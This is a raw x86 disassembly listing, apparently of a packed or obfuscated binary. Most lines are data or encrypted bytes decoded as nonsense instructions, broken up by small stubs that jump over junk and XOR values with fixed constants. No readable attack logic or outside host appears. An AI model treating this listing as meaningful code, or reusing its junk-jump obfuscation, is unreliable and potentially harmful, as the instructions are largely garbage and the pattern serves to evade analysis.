  410918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410919:	pop    esp
  41091a:	out    0x58,eax
  41091c:	ret    
  41091d:	iret   
  41091e:	jb     0x4108ec
  410920:	into   
  410921:	jo     0x410927
  410923:	mov    eax,ds:0x3b770c99
  410928:	add    DWORD PTR [esi-0x69],esp
  41092b:	xor    al,0x25
  41092d:	out    0x7d,eax
  41092f:	in     eax,0xdf
  410931:	fs pop edi
  410933:	dec    ebp
  410934:	xchg   esp,eax
  410935:	popa   
  410936:	dec    edx
  410937:	adc    eax,DWORD PTR [ebx+0x76]
  41093a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41093b:	xor    al,0x51
  41093d:	lods   al,BYTE PTR ds:[esi]
  41093e:	sahf   
  41093f:	pushf  
  410940:	frstor [edx+eiz*4]
  410944:	push   ebx
  410945:	pop    ebp
  410946:	(bad)  
  410947:	shr    BYTE PTR [ebx-0x4b],1
  41094a:	sbb    dh,al
  41094c:	add    ebp,DWORD PTR [eax+edx*2]
  41094f:	or     bl,bl
  410951:	mov    BYTE PTR [edx],ch
  410953:	pop    edx
  410954:	mov    dh,0x5c
  410956:	out    dx,eax
  410957:	dec    ecx
  410958:	mov    ds:0x7217d577,al
  41095d:	jb     0x4109b7
  41095f:	add    cl,ch
  410961:	call   0xe06e1b7a
  410966:	push   esp
  410967:	fisttp QWORD PTR ds:0x2e37516e
  41096d:	imul   eax,DWORD PTR [esi+0x2c],0x56
  410971:	aaa    
  410972:	stos   BYTE PTR es:[edi],al
  410973:	adc    esi,DWORD PTR [ebx+0x15]
  410976:	xchg   ecx,eax
  410977:	pop    esi
  410978:	inc    ebp
  410979:	lds    edx,FWORD PTR [edx+0x49]
  41097c:	cli    
  41097d:	aad    0x4f
  41097f:	out    0x1e,al
  410981:	xchg   esi,eax
  410982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410983:	adc    bl,dl
  410985:	mov    WORD PTR [ebp+0x49ca3f57],gs
  41098b:	jle    0x4109aa
  41098d:	(bad)  
  41098e:	add    al,BYTE PTR [esi+0x27923ec3]
  410994:	inc    esi
  410995:	jle    0x41099f
  410997:	shl    DWORD PTR [esp+ebx*2-0x5e],0xcb
  41099c:	cdq    
  41099d:	call   edi
  41099f:	jnp    0x410a15
  4109a1:	sbb    ah,BYTE PTR [edi+0x12018aaf]
  4109a7:	mov    esp,0xd2d4fbae
  4109ac:	lock ss push 0xffffffa2
  4109b0:	xchg   ebx,eax
  4109b1:	inc    edi
  4109b2:	out    0x1a,al
  4109b4:	sub    eax,0xd169bdba
  4109b9:	cmp    edi,ebx
  4109bb:	or     BYTE PTR [eax-0x28],dl
  4109be:	jno    0x41099c
  4109c0:	xor    ebx,0xf99fa0b2
  4109c6:	test   DWORD PTR [ebp+0x1],0x7107d5f4
  4109cd:	mul    DWORD PTR [ebp+0x539b9c0c]
  4109d3:	jmp    DWORD PTR [ebp-0xf]
  4109d6:	(bad)  
  4109d7:	mov    dl,0x2c
  4109d9:	sahf   
  4109da:	xlat   BYTE PTR ds:[ebx]
  4109db:	push   ds
  4109dc:	and    DWORD PTR [ecx+0x23],edi
  4109df:	mov    al,0x65
  4109e1:	xlat   BYTE PTR ds:[ebx]
  4109e2:	mov    edx,0xcacc8d0c
  4109e7:	sti    
  4109e8:	(bad)  
  4109ea:	ds mov al,0xaf
  4109ed:	sub    BYTE PTR [eax],dl
  4109ef:	cmp    DWORD PTR [ecx+0x2184dd99],esp
  4109f5:	std    
  4109f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109f7:	mov    edi,0x9b2b9dd0
  4109fc:	xor    edi,DWORD PTR [eax+edx*8+0x73f417a6]
  410a03:	add    ch,BYTE PTR [eax]
  410a05:	daa    
  410a06:	je     0x4109d2
  410a08:	pop    ecx
  410a09:	jp     0x410a0d
  410a0b:	test   BYTE PTR [ecx],bh
  410a0d:	dec    DWORD PTR [edi+0x30bf0a32]
  410a13:	sub    DWORD PTR [ebx-0xc2f76de],0x5866463c
  410a1d:	dec    ebp
  410a1e:	jo     0x4109df
  410a20:	push   0x33
  410a22:	push   esi
  410a23:	fimul  WORD PTR [ecx-0x62505d5]
  410a29:	sub    ecx,esi
  410a2b:	add    BYTE PTR [eax],0x44
  410a2e:	jb     0x410a44
  410a30:	sub    ebp,DWORD PTR [edi+0x9]
  410a33:	aam    0x8d
  410a35:	push   ds
  410a36:	in     eax,0xbe
  410a38:	(bad)  
  410a39:	in     eax,dx
  410a3a:	imul   DWORD PTR [esi+0x52]
  410a3d:	push   edi
  410a3e:	jne    0x4109e3
  410a40:	sti    
  410a41:	in     al,0x90
  410a43:	sub    al,ch
  410a45:	pop    ds
  410a46:	xlat   BYTE PTR ds:[ebx]
  410a47:	das    
  410a48:	popf   
  410a49:	pop    ecx
  410a4a:	cld    
  410a4b:	mov    esp,0x7b44d470
  410a50:	not    ch
  410a52:	loopne 0x410abf
  410a54:	call   0x9e41:0xdddc1a3f
  410a5b:	jno    0x410a15
  410a5d:	jge    0x410a8a
  410a5f:	out    dx,al
  410a60:	lods   eax,DWORD PTR ds:[esi]
  410a61:	xchg   ecx,eax
  410a62:	add    dl,BYTE PTR [ecx+0x1ccce6df]
  410a68:	fist   DWORD PTR cs:[ecx-0x1a]
  410a6c:	and    DWORD PTR [edx],esi
  410a6e:	test   BYTE PTR [ecx+0x28],ch
  410a71:	fiadd  WORD PTR [edi-0x15]
  410a74:	add    eax,0x61696812
  410a79:	adc    ebp,DWORD PTR [edi-0x644b51df]
  410a7f:	outs   dx,DWORD PTR ds:[esi]
  410a80:	scas   eax,DWORD PTR es:[edi]
  410a81:	adc    BYTE PTR [edx-0x1fc2cae1],ah
  410a87:	idiv   DWORD PTR [edi]
  410a89:	aam    0xd5
  410a8b:	lahf   
  410a8c:	int    0x2e
  410a8e:	mov    al,0xc6
  410a90:	pusha  
  410a91:	inc    edx
  410a92:	jge    0x410b03
  410a94:	mov    ecx,0xb6f3331a
  410a99:	xchg   DWORD PTR [edx],ecx
  410a9b:	test   BYTE PTR [edx-0x1e2f67f6],bh
  410aa1:	or     ah,dl
  410aa3:	sbb    DWORD PTR ss:[edi-0x315286cc],0xe4fe797a
  410aae:	adc    eax,0x38e4c8b5
  410ab3:	pop    ebp
  410ab4:	ins    BYTE PTR es:[edi],dx
  410ab5:	retf   
  410ab6:	push   ecx
  410ab7:	lods   al,BYTE PTR ds:[esi]
  410ab8:	xor    eax,DWORD PTR [eax-0x23a41c05]
  410abe:	or     BYTE PTR [esi+ebx*8],al
  410ac1:	mov    esp,0x5eb065b
  410ac6:	ja     0x410b13
  410ac8:	jbe    0x410ac2
  410aca:	fptan  
  410acc:	ins    BYTE PTR es:[edi],dx
  410acd:	fnsave [ebp-0x40064e21]
  410ad3:	mov    ds:0xfe84ab2e,eax
  410ad8:	out    0x93,eax
  410ada:	mov    ecx,0xf90c0587
  410adf:	cld    
  410ae0:	(bad)  
  410ae1:	(bad)  
  410ae2:	mov    esi,0x1418affe
  410ae7:	mov    cl,0x6e
  410ae9:	pop    edi
  410aea:	and    DWORD PTR [esi-0x7b],ecx
  410aed:	rol    edx,cl
  410aef:	fs mov ch,0x29
  410af2:	push   edi
  410af3:	jge    0x410b1d
  410af5:	int3   
  410af6:	dec    DWORD PTR [esi-0x49]
  410af9:	dec    ebx
  410afa:	js     0x410b50
  410afc:	push   edi
  410afd:	aaa    
  410afe:	or     BYTE PTR ds:0xaaa92e41,0x5e
  410b05:	and    bh,BYTE PTR [ecx+0x59b8cc13]
  410b0b:	inc    edx
  410b0c:	bnd jae 0x410af7
  410b0f:	loope  0x410abc
  410b11:	or     ah,al
  410b13:	ror    BYTE PTR [edi-0x67da4ef5],1
  410b19:	add    ch,BYTE PTR [esi+0x44]
  410b1c:	push   0x3faaff62
  410b21:	mov    eax,ds:0x3bb43469
  410b26:	xor    BYTE PTR [ecx+ecx*1+0x13],cl
  410b2a:	mov    eax,0x242fb78b
  410b2f:	fistp  QWORD PTR [eax-0x74e64a82]
  410b35:	stc    
  410b36:	icebp  
  410b37:	mov    eax,ds:0x990ffd8d
  410b3c:	pop    es
  410b3d:	mov    dl,0xea
  410b3f:	add    ebp,DWORD PTR es:[eax+0x54]
  410b43:	int    0x51
  410b45:	stos   DWORD PTR es:[edi],eax
  410b46:	(bad)  
  410b47:	ficomp DWORD PTR [ebp-0x3c1030f0]
  410b4d:	jmp    0x410bb7
  410b4f:	nop
  410b50:	test   eax,0xcaf40b0f
  410b55:	js     0x410bc8
  410b57:	leave  
  410b58:	int3   
  410b59:	in     eax,0xbe
  410b5b:	ja     0x410b15
  410b5d:	xchg   ebx,eax
  410b5e:	lahf   
  410b5f:	mov    esi,0x544639c6
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz mov ah,bh
  410ba6:	fisttp DWORD PTR [esi+edi*1]
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c12
  410bb1:	jecxz  0x410b35
  410bb3:	js     0x410b97
  410bb5:	test   al,0x83
  410bb7:	add    al,0xf8
  410bb9:	ret    0x4031
  410bbc:	retf   0x7837
  410bbf:	mov    eax,fs
  410bc1:	inc    edi
  410bc2:	mov    ebp,0xd50a04e3
  410bc7:	sub    eax,0x9af48e45
  410bcc:	and    al,0xd2
  410bce:	mov    BYTE PTR [ebp-0x244b09fa],bl
  410bd4:	mov    ds:0x2f95ee26,eax
  410bd9:	pop    ds
  410bda:	popa   
  410bdb:	jbe    0x410ba5
  410bdd:	push   0x3707c4ca
  410be2:	aaa    
  410be3:	das    
  410be4:	sub    ch,BYTE PTR [edi]
  410be6:	loopne 0x410c33
  410be8:	addr16 jmp 0x410bb1
  410beb:	pop    ecx
  410bec:	fwait
  410bed:	loop   0x410c16
  410bef:	push   ebx
  410bf0:	hlt    
  410bf1:	mov    edi,0x36ff6a1d
  410bf6:	mov    ds:0x8f26cabb,eax
  410bfb:	sar    BYTE PTR [ebx],0x23
  410bfe:	or     DWORD PTR [ebp+eax*8-0x428d1357],esi
  410c05:	test   cl,dl
  410c07:	mov    esp,0x10a6f77a
  410c0c:	sbb    bh,al
  410c0e:	jecxz  0x410b9d
  410c10:	jmp    0xf35087f9
  410c15:	inc    edi
  410c16:	xchg   BYTE PTR ds:0x27024e6b,ch
  410c1c:	xor    esi,DWORD PTR [ebx]
  410c1e:	in     al,dx
  410c1f:	xchg   BYTE PTR ds:0xa5aaf848,al
  410c25:	fsub   QWORD PTR [ecx+eax*4-0x54]
  410c29:	ret    0x3063
  410c2c:	neg    DWORD PTR [ecx]
  410c2e:	or     eax,0xd32fcf6d
  410c33:	out    0x48,al
  410c35:	aas    
  410c36:	(bad)  [esi-0xe]
  410c39:	adc    BYTE PTR [ebp+0x66],al
  410c3c:	out    dx,al
  410c3d:	jmp    0xd6c7:0xc22775f
  410c44:	mov    edi,0xdf6883bc
  410c49:	add    al,0xff
  410c4b:	jae    0x410cba
  410c4d:	push   esp
  410c4e:	pop    esp
  410c4f:	ror    BYTE PTR [edi+0x557c7cf6],0xc5
  410c56:	mov    al,ds:0x332dac5f
  410c5b:	inc    ebx
  410c5c:	and    ebp,DWORD PTR [esi+0x28]
  410c5f:	repz add dh,ah
  410c62:	sbb    al,0xa6
  410c64:	cmc    
  410c65:	sbb    dh,BYTE PTR [esi+edx*2]
  410c68:	(bad)  
  410c69:	(bad)  
  410c6b:	or     BYTE PTR [ebx-0x49],bh
  410c6e:	push   edi
  410c6f:	mov    al,0xcf
  410c71:	pop    esi
  410c72:	cld    
  410c73:	ror    DWORD PTR [eax+0x6a1cab94],1
  410c79:	jae    0x410c56
  410c7b:	pop    es
  410c7c:	inc    ebx
  410c7d:	jmp    0xfc41:0xeb68c857
  410c84:	mov    dh,0x55
  410c86:	popf   
  410c87:	and    eax,0xddeaa370
  410c8c:	into   
  410c8d:	rcr    edx,cl
  410c8f:	stc    
  410c90:	cmp    esi,esp
  410c92:	push   ss
  410c93:	dec    edx
  410c94:	(bad)  
  410c95:	sbb    eax,0x538cf884
  410c9a:	(bad)  
  410c9b:	fisubr DWORD PTR [ebx-0x70]
  410c9e:	cmc    
  410c9f:	xchg   edx,eax
  410ca0:	jno    0x410d0c
  410ca2:	out    0xf1,eax
  410ca4:	ror    DWORD PTR [edx+edi*4+0x8],cl
  410ca8:	push   esp
  410ca9:	(bad)  
  410caa:	cmp    cl,dh
  410cac:	pop    es
  410cad:	and    edx,ebx
  410caf:	cld    
  410cb0:	enter  0xf372,0x9f
  410cb4:	push   edx
  410cb5:	jl     0x410d2a
  410cb7:	xor    edi,DWORD PTR [esi-0x5]
  410cba:	pusha  
  410cbb:	ficomp DWORD PTR [edi-0x308901da]
  410cc1:	sahf   
  410cc2:	dec    eax
  410cc3:	xor    al,0x7f
  410cc5:	pop    ebp
  410cc6:	(bad)  
  410cc8:	scas   al,BYTE PTR es:[edi]
  410cc9:	in     eax,0x6c
  410ccb:	mov    ds:0xd9e0b9d1,eax
  410cd0:	out    dx,al
  410cd1:	mov    al,0xa6
  410cd3:	daa    
  410cd4:	pop    edi
  410cd5:	aas    
  410cd6:	pop    ebx
  410cd7:	int    0xca
  410cd9:	mov    ?,WORD PTR [edx]
  410cdb:	sub    BYTE PTR [ecx+0x1c6fb63d],ah
  410ce1:	mov    bh,0xfa
  410ce3:	aaa    
  410ce4:	sub    al,BYTE PTR gs:[ebx]
  410ce7:	test   ecx,esi
  410ce9:	(bad)  
  410cea:	mov    edi,0xd2b76ea7
  410cef:	(bad)  
  410cf0:	sbb    bl,bl
  410cf2:	test   BYTE PTR [ebx],ch
  410cf4:	add    ecx,ebx
  410cf6:	or     dl,BYTE PTR [ebx-0xd0e3440]
  410cfc:	xor    esp,ebx
  410cfe:	ja     0x410cf3
  410d00:	or     BYTE PTR [eax],dl
  410d02:	mov    ch,0x10
  410d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d05:	pop    edx
  410d06:	sbb    eax,0x5b8c9044
  410d0b:	mov    dh,0xca
  410d0d:	popa   
  410d0e:	fs and ah,bh
  410d11:	jo     0x410ccb
  410d13:	jnp    0x410d48
  410d15:	stos   DWORD PTR es:[edi],eax
  410d16:	jmp    0x410d7e
  410d18:	adc    eax,0x46cafc14
  410d1d:	jl     0x410d1e
  410d1f:	js     0x410d6e
  410d21:	in     eax,0x9b
  410d23:	ins    DWORD PTR es:[edi],dx
  410d24:	jg     0x410d15
  410d26:	mov    dl,0x1f
  410d28:	ins    DWORD PTR es:[edi],dx
  410d29:	and    al,0xa3
  410d2b:	pop    esi
  410d2c:	pop    es
  410d2d:	inc    esi
  410d2e:	sahf   
  410d2f:	js     0x410d28
  410d31:	push   cs
  410d32:	and    esi,esp
  410d34:	xchg   edi,eax
  410d35:	jecxz  0x410d57
  410d37:	xchg   ebp,eax
  410d38:	jle    0x410d28
  410d3a:	nop
  410d3b:	pop    ebp
  410d3c:	sub    al,0xf
  410d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d3f:	xchg   ebx,eax
  410d40:	pop    edx
  410d41:	lea    esp,[eax]
  410d43:	sahf   
  410d44:	shr    DWORD PTR [edi],cl
  410d46:	fbstp  TBYTE PTR [edx-0x777f04fa]
  410d4c:	pushf  
  410d4d:	lahf   
  410d4e:	xor    al,0xbd
  410d50:	call   ebx
  410d52:	call   0x77831359
  410d57:	stos   DWORD PTR es:[edi],eax
  410d58:	cmp    DWORD PTR [esi],edi
  410d5a:	adc    edx,DWORD PTR [ecx]
  410d5c:	test   eax,0xecfe906f
  410d61:	push   0xee903d8d
  410d66:	gs inc ecx
  410d68:	sub    esi,DWORD PTR [ebx]
  410d6a:	or     eax,0x56924e9a
  410d6f:	mov    edi,0x1cc85263
  410d74:	pop    es
  410d75:	jae    0x410d6b
  410d77:	adc    DWORD PTR [ebx-0x7ccb5407],esi
  410d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d7e:	sbb    bl,bl
  410d80:	pop    ebp
  410d81:	lea    eax,[esi+0x61]
  410d84:	push   edx
  410d85:	or     dl,bl
  410d87:	pop    eax
  410d88:	scas   al,BYTE PTR es:[edi]
  410d89:	shl    ebp,1
  410d8b:	add    al,0x8
  410d8d:	hlt    
  410d8e:	fs cmc 
  410d90:	jae    0x410d92
  410d92:	in     al,0x6a
  410d94:	popf   
  410d95:	mov    ds:0x6aa4fecc,eax
  410d9a:	pop    eax
  410d9b:	gs mov edx,0x9bc22e07
  410da1:	sbb    eax,0x1d4f781d
  410da6:	add    bh,dh
  410da8:	retf   
  410da9:	(bad)  
  410daa:	sbb    BYTE PTR ds:0x8d32cc85,ch
  410db0:	mov    esp,0x4c955cfc
  410db5:	add    dl,BYTE PTR [ecx-0x2d]
  410db8:	mov    eax,ds:0xaaf952c0
  410dbd:	push   eax
  410dbe:	ucomiss xmm7,DWORD PTR [eax+0x5c]
  410dc2:	mov    bl,0xb3
  410dc4:	sbb    DWORD PTR [edx+0x28a519e8],eax
  410dca:	jmp    FWORD PTR [eax]
  410dcc:	sub    DWORD PTR [eax],edi
  410dce:	lods   eax,DWORD PTR ds:[esi]
  410dcf:	or     eax,0x2606813c
  410dd4:	xchg   edx,eax
  410dd5:	fisub  WORD PTR [esi]
  410dd7:	or     eax,0x9cb3b34c
  410ddc:	pop    edi
  410ddd:	pop    edx
  410dde:	(bad)  
  410ddf:	jg     0x410dbc
  410de1:	sub    al,0xab
  410de3:	div    edi
  410de5:	mov    ds:0x12208d5e,al
  410dea:	out    dx,al
  410deb:	adc    eax,0x86e82a98
  410df0:	rcl    DWORD PTR [ebp-0x12026c92],1
  410df6:	ins    DWORD PTR es:[edi],dx
  410df7:	bound  edi,QWORD PTR ds:0xcc18b320
  410dfd:	xchg   edx,eax
  410dfe:	sbb    ebp,esi
  410e00:	adc    al,0x96
  410e02:	ret    0x9d19
  410e05:	dec    esi
  410e06:	sbb    al,0xd1
  410e08:	pop    ss
  410e09:	fcomp  QWORD PTR [edx+edx*8+0x37e8a174]
  410e10:	sbb    cl,BYTE PTR [edi+0x1475d1ce]
  410e16:	pop    eax
  410e17:	test   eax,0x1e0258e0
  410e1c:	(bad)  
  410e1d:	loop   0x410dd2
  410e1f:	mov    al,ds:0x787500b9
  410e24:	and    al,BYTE PTR [eax+0x65]
  410e27:	cmc    
  410e28:	xchg   DWORD PTR [ecx+esi*4],esi
  410e2b:	outs   dx,BYTE PTR ds:[esi]
  410e2c:	lods   al,BYTE PTR ds:[esi]
  410e2d:	xchg   esi,eax
  410e2e:	shr    DWORD PTR [eax+ebx*4+0x7a],0x7d
  410e33:	fnstcw WORD PTR [ecx]
  410e35:	shl    DWORD PTR ds:0xe0f4bc24,cl
  410e3b:	pop    ebx
  410e3c:	add    ebx,DWORD PTR [edi+0x55e66adf]
  410e42:	push   ds
  410e43:	push   ebx
  410e44:	arpl   WORD PTR [ebp+0x7f059dd],si
  410e4a:	push   ecx
  410e4b:	dec    edi
  410e4c:	push   ecx
  410e4d:	xlat   BYTE PTR ds:[ebx]
  410e4e:	ffreep st(5)
  410e50:	push   ecx
  410e51:	dec    edx
  410e52:	sbb    ebp,ebp
  410e54:	rcr    DWORD PTR [eax],0xbf
  410e57:	lahf   
  410e58:	push   esi
  410e59:	cmp    ebx,DWORD PTR [ebp+0x69]
  410e5c:	ja     0x410e5f
  410e5e:	push   es
  410e5f:	push   eax
  410e60:	sbb    BYTE PTR [esi+0x36996f16],ch
  410e66:	pop    es
  410e67:	xchg   si,ax
  410e69:	xchg   ebp,eax
  410e6a:	(bad)  
  410e6b:	sbb    DWORD PTR [ebp+eax*2-0x37a85424],ecx
  410e72:	addr16 pop es
  410e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e75:	dec    eax
  410e76:	jb     0x410e9a
  410e78:	pop    edx
  410e79:	jg     0x410ea0
  410e7b:	cmp    esi,eax
  410e7d:	dec    esi
  410e7e:	mov    al,0x5f
  410e80:	push   es
  410e81:	xchg   edx,eax
  410e82:	or     eax,0x20ed0186
  410e87:	xchg   BYTE PTR [ecx+ecx*8+0x6b5aee21],dh
  410e8e:	adc    ah,BYTE PTR [ecx+ebx*4-0x5a181187]
  410e95:	aam    0xcf
  410e97:	xlat   BYTE PTR ds:[ebx]
  410e98:	push   ebp
  410e99:	mov    bh,0x7
  410e9b:	or     al,dl
  410e9d:	ja     0x410e43
  410e9f:	dec    edx
  410ea0:	test   DWORD PTR [eax],edi
  410ea2:	sbb    eax,0x68bfc954
  410ea7:	xor    ah,cl
  410ea9:	and    eax,0xb3369e15
  410eae:	add    eax,0x3157c14b
  410eb3:	out    0x2d,eax
  410eb5:	push   es
  410eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eb7:	mov    edi,0x438afd6e
  410ebc:	adc    al,0xb
  410ebe:	mov    dl,0xbf
  410ec0:	inc    ebp
  410ec1:	xchg   DWORD PTR [ebx],ebp
  410ec3:	shl    cl,cl
  410ec5:	fbld   TBYTE PTR [edi-0x11]
  410ec8:	fnstsw WORD PTR [edx]
  410eca:	pop    ebx
  410ecb:	mov    bh,BYTE PTR [esi-0xc94af82]
  410ed1:	gs mov gs,ecx
  410ed4:	push   ds
  410ed5:	mov    ds:0x3159a0f0,al
  410eda:	je     0x410efb
  410edc:	outs   dx,DWORD PTR ds:[esi]
  410edd:	test   eax,0x8623d077
  410ee2:	imul   ebx,ebx,0x34c775c5
  410ee8:	and    eax,0x9b9217e1
  410eed:	mov    ds,WORD PTR [esi]
  410eef:	sub    cl,cl
  410ef1:	ret    
  410ef2:	(bad)
  410ef6:	sar    DWORD PTR [ecx],cl
  410ef8:	fcmovnu st,st(7)
  410efa:	push   cs
  410efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410efc:	mov    bl,0x9
  410efe:	dec    edi
  410eff:	rol    DWORD PTR [edx+eiz*2],1
  410f02:	sbb    DWORD PTR [esi-0x2],ebp
  410f05:	xor    DWORD PTR [edi+0x6f],0xffffffd7
  410f09:	repnz aaa 
  410f0b:	sub    eax,0x800e89ca
  410f10:	cmp    BYTE PTR ds:0x1c2b75fd,0xc5
  410f17:	dec    edi
  410f18:	xchg   ecx,eax
  410f19:	add    DWORD PTR [edx+ecx*2+0x65f1c5cf],ebx
  410f20:	sti    
  410f21:	lahf   
  410f22:	js     0x410ebb
  410f24:	jne    0x410f1a
  410f26:	mov    bh,0x27
  410f28:	xor    DWORD PTR [edi+0x35da698e],esp
  410f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f2f:	daa    
  410f30:	cdq    
  410f31:	hlt    
  410f32:	mov    esi,DWORD PTR [eax]
  410f34:	jne    0x410f31
  410f36:	jns    0x410fb1
  410f38:	mov    dl,0x77
  410f3a:	popa   
  410f3b:	std    
  410f3c:	push   ebp
  410f3d:	shl    ecx,cl
  410f3f:	inc    edi
  410f40:	jl     0x410f64
  410f42:	push   0x34
  410f44:	(bad)  
  410f45:	sbb    dl,ah
  410f47:	push   ebp
  410f48:	popf   
  410f49:	push   0xf684665b
  410f4e:	nop
  410f4f:	mov    dh,0xe5
  410f51:	lea    edi,[edi+eiz*4+0x7]
  410f55:	mov    dl,0xb2
  410f57:	(bad)  
  410f58:	sub    DWORD PTR [esi-0x18],esp
  410f5b:	xor    al,BYTE PTR [ecx]
  410f5d:	mov    esi,es
  410f5f:	sbb    eax,0x1745350f
  410f64:	inc    edx
  410f65:	or     ch,bl
  410f67:	pop    ds
  410f68:	inc    esi
  410f69:	test   DWORD PTR ds:0xc29f7d70,esi
  410f6f:	scas   eax,DWORD PTR es:[edi]
  410f70:	mov    WORD PTR [edx+0x49c557f],?
  410f76:	js     0x410f76
  410f78:	xor    BYTE PTR [edx],bl
  410f7a:	jo     0x410fc0
  410f7c:	ror    DWORD PTR [edi-0x628f67e0],1
  410f82:	gs (bad) 
  410f84:	in     eax,dx
  410f85:	(bad)  
  410f86:	repz sbb BYTE PTR [ecx-0x3c],al
  410f8a:	pop    esp
  410f8b:	xor    eax,0xfb2259b7
  410f90:	call   0x828f:0xb031513b
  410f97:	adc    esp,DWORD PTR [ecx+0x41b22c]
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fdee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e19c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x2e3ba397]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f5e
  410fdd:	xor    al,0x72
  410fdf:	int    0xec
  410fe1:	ficomp WORD PTR [eax+0x5dba3bb]
  410fe7:	aaa    
  410fe8:	xchg   ebx,ebp
  410fea:	jae    0x410fc6
  410fec:	jo     0x41103d
  410fee:	cld    
  410fef:	mov    ah,0xca
  410ff1:	pop    esi
  410ff2:	mov    bh,0x68
  410ff4:	scas   al,BYTE PTR es:[edi]
  410ff5:	inc    eax
  410ff6:	sub    eax,0x1f560411
  410ffb:	push   ecx
  410ffc:	cmc    
  410ffd:	fidivr WORD PTR [esi]
  410fff:	in     eax,dx
  411000:	jnp    0x410f85
  411002:	xor    al,0xb0
  411004:	in     al,dx
  411005:	adc    DWORD PTR [edx-0x5cb237d2],0x258f37d7
  41100f:	inc    edi
  411010:	aam    0x7e
  411012:	shl    BYTE PTR [esi-0x6ec31996],1
  411018:	mov    eax,0xf9ebb27d
  41101d:	push   ds
  41101e:	lock mov eax,0xbfcd4237
  411024:	dec    esp
  411025:	mov    ch,0xae
  411027:	pop    ecx
  411028:	push   ss
  411029:	sbb    BYTE PTR [ecx],cl
  41102b:	add    al,0xd6
  41102d:	push   eax
  41102e:	out    dx,al
  41102f:	xchg   ebp,eax
  411030:	test   DWORD PTR [ebx],esp
  411032:	lahf   
  411033:	arpl   WORD PTR [eax],di
  411035:	jg     0x410fbe
  411037:	dec    esp
  411038:	fistp  DWORD PTR [edi+0x5d986434]
  41103e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41103f:	adc    bl,BYTE PTR [ecx]
  411041:	jne    0x411078
  411043:	aas    
  411044:	and    al,0x2b
  411046:	xchg   esp,eax
  411047:	nop
  411048:	fsubr  DWORD PTR [esi-0xd]
  41104b:	jb     0x4110c2
  41104d:	cmp    eax,0x934b4c25
  411052:	add    esp,eax
  411054:	in     al,0xdb
  411056:	mov    bl,0xf9
  411058:	pop    eax
  411059:	mov    dl,BYTE PTR [ebx+0x3]
  41105c:	cmp    DWORD PTR [edx+0x68907521],edx
  411062:	adc    bh,BYTE PTR [edi+0x3a]
  411065:	or     al,bl
  411067:	xchg   BYTE PTR [edi+0x22],dh
  41106a:	pop    esp
  41106b:	and    dh,BYTE PTR [edx]
  41106d:	dec    esi
  41106e:	stos   DWORD PTR es:[edi],eax
  41106f:	mov    al,ds:0x2e3fd4d0
  411074:	sar    bh,1
  411076:	jp     0x411003
  411078:	nop
  411079:	sbb    DWORD PTR [ebx+0x59a39193],ebp
  41107f:	xor    BYTE PTR [ebx+0x7e],ah
  411082:	xchg   esi,eax
  411083:	lds    esp,FWORD PTR [ebx+0x5f]
  411086:	bound  edx,QWORD PTR [ecx+edi*1+0x5]
  41108a:	sti    
  41108b:	scas   al,BYTE PTR es:[edi]
  41108c:	jge    0x411109
  41108e:	and    bh,dh
  411090:	and    dl,bl
  411092:	les    ecx,FWORD PTR [esi-0x647a77ce]
  411098:	jg     0x411032
  41109a:	pop    ds
  41109b:	test   ebx,edi
  41109d:	mov    esp,0x6c76939
  4110a2:	and    al,0x48
  4110a4:	pop    edx
  4110a5:	aad    0x80
  4110a7:	retf   
  4110a8:	mov    dh,0xb4
  4110aa:	std    
  4110ab:	outs   dx,DWORD PTR ds:[esi]
  4110ac:	sbb    esi,DWORD PTR [edx+0x26]
  4110af:	push   ecx
  4110b0:	jae    0x411080
  4110b2:	lahf   
  4110b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b4:	enter  0x21c7,0xcc
  4110b8:	(bad)  
  4110b9:	mov    eax,0x44bc90e
  4110be:	inc    edx
  4110bf:	lahf   
  4110c0:	repz or eax,0x16cded4b
  4110c6:	and    BYTE PTR [edi],ch
  4110c8:	dec    eax
  4110c9:	or     al,0x8f
  4110cb:	mov    dh,0x33
  4110cd:	jne    0x411057
  4110cf:	dec    ecx
  4110d0:	in     eax,dx
  4110d1:	mov    dl,0x97
  4110d3:	cmp    eax,0x59e25e00
  4110d8:	int3   
  4110d9:	sbb    al,0x4a
